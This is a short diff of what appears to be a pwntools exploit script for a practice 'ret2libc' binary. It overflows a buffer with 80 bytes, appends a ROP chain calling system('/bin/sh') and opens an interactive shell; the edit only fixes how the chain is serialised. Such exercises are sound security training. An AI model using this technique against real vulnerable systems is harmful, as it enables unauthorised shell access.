@@ -7,5 +7,5 @@ rop = ROP("./ret2libc")
 rop.system(e.search("/bin/sh").next())
 
 p = process("./ret2libc")
-p.sendline("A" * 80 + str(rop))
+p.sendline("A" * 80 + rop.chain())
 p.interactive()
